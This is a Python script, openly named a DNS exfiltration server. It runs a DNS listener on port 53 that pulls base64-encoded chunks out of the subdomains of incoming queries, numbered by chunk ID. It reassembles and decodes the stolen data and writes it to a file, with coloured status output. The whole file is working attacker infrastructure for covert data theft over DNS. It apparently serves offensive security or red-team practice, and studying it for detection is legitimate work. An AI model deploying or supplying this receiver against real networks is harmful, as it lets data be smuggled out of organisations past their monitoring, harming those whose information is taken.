#!/usr/bin/env python3

from dnslib.server import DNSServer, BaseResolver, DNSLogger
from dnslib import RR, A, QTYPE
import base64
import argparse
from colorama import init, Fore, Style

init(autoreset=True)

class CustomDNSLogger(DNSLogger):
    def __init__(self):
        super().__init__()
        self.processed_queries = set()

    def log_request(self, handler, request):
        query_name = str(request.q.qname)
        if query_name not in self.processed_queries:
            print(f"{Style.BRIGHT}{Fore.GREEN}[+] {Style.BRIGHT}{Fore.CYAN}Received DNS query for: {Fore.YELLOW}{query_name}")
            self.processed_queries.add(query_name)

    def log_reply(self, handler, reply):
        pass

class ExfiltrationResolver(BaseResolver):
    def __init__(self, output_file):
        super().__init__()
        self.data_chunks = {}
        self.output_file = output_file
        self.last_chunk_id = -1
        self.expected_chunks = None
    
    def resolve(self, request, handler):
        query_name = str(request.q.qname)
        print(f"{Style.BRIGHT}{Fore.GREEN}[+] {Style.BRIGHT}{Fore.MAGENTA}Saving the received data to {self.output_file}...")

        try:
            # Split the query name and get the chunk data
            subdomain = query_name.split('.')[0]
            chunk_id, encoded_data = subdomain.split('-', 1)
            
            # Store the encoded chunk
            self.data_chunks[chunk_id] = encoded_data
            
            # Try to decode and display the current chunk
            try:
                # Add padding if needed
                padding = len(encoded_data) % 4
                if padding:
                    encoded_data += '=' * (4 - padding)
                
                decoded_chunk = base64.b64decode(encoded_data).decode()
                print(f"{Style.BRIGHT}{Fore.GREEN}[+] {Style.BRIGHT}{Fore.CYAN}Received chunk {chunk_id}: {Fore.YELLOW}{decoded_chunk}")
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Could not decode chunk {chunk_id} for display: {e}")

            # Try to write to file after each chunk
            self.try_write_to_file()

            reply = request.reply()
            reply.add_answer(*self.data_chunks_response())
            return reply

        except Exception as e:
            print(f"{Fore.RED}{Style.BRIGHT}[-] Failed to process query: {e}")
            reply = request.reply()
            reply.header.rcode = 3
            return reply

    def data_chunks_response(self):
        return [RR(query_name, QTYPE.A, rdata=A("0.0.0.0"), ttl=60) for query_name in self.data_chunks]

    def try_write_to_file(self):
        """Try to write the current data to file."""
        try:
            # Get all available chunks in order
            available_chunks = []
            i = 0
            while str(i).zfill(3) in self.data_chunks:
                available_chunks.append(self.data_chunks[str(i).zfill(3)])
                i += 1

            if not available_chunks:
                return

            # Combine the chunks
            combined_data = ''.join(available_chunks)
            
            # Add padding if needed
            padding = len(combined_data) % 4
            if padding:
                combined_data += '=' * (4 - padding)
            
            try:
                # Decode and write the data
                decoded_data = base64.b64decode(combined_data).decode()
                with open(self.output_file, 'w') as f:  # Use 'w' instead of 'a' to overwrite
                    f.write(decoded_data)
                    f.flush()
                print(f"{Style.BRIGHT}{Fore.GREEN}[+] {Style.BRIGHT}{Fore.GREEN}Data written to {self.output_file}")
            except Exception as e:
                print(f"{Fore.RED}{Style.BRIGHT}[-] Failed to decode/write data: {e}")
        except Exception as e:
            print(f"{Fore.RED}{Style.BRIGHT}[-] Failed to process chunks: {e}")

    def save_file(self, filename):
        """Final save attempt when server is shutting down."""
        self.try_write_to_file()

def ParseArgs():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description="DNS exfiltration server.")
    parser.add_argument("-o", "--output", required=True, help="Path to the output file.")
    parser.add_argument("-p", "--port", type=int, default=53, help="Server listening port. Default is 53.")
    return parser.parse_args()

def IniServer(port, logger, output_file):
    """Initialize and start the DNS server."""
    resolver = ExfiltrationResolver(output_file)
    server = DNSServer(resolver, port=port, address="0.0.0.0", logger=logger)
    server.start_thread()
    return server, resolver

if __name__ == "__main__":
    try:
        args = ParseArgs()
        logger = CustomDNSLogger()
        server, resolver = IniServer(args.port, logger, args.output)

        print(f"{Fore.GREEN}{Style.BRIGHT}[+] DNS Server started...")
        while True:
            pass
    except KeyboardInterrupt:
        print(f"{Fore.MAGENTA}{Style.BRIGHT}\n[+] Saving the received data to file...")
        resolver.save_file(args.output)
    except Exception as e:
        print(f"{Fore.RED}{Style.BRIGHT}[-] Error: {e}")
        exit(1)